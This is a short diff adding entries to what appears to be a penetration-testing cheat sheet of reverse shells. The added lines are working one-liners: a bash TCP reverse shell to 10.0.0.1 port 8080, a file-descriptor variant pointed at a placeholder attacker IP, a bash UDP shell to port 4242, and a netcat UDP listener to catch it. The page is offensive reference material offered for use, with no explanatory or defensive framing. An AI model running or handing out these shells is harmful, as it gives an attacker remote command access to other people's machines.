@@ -81,7 +81,19 @@ Tags: bash, cheatsheet, netcat, pentest, perl, php, python, reverseshell, ruby, 
 Posted in Shells
 
 
+# Bash TCP
 
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
+
+# Bash UDP
+
+Victim:
+sh -i >& /dev/udp/127.0.0.1/4242 0>&1
+
+Listener:
+nc -u -lvp 4242
 
 
 
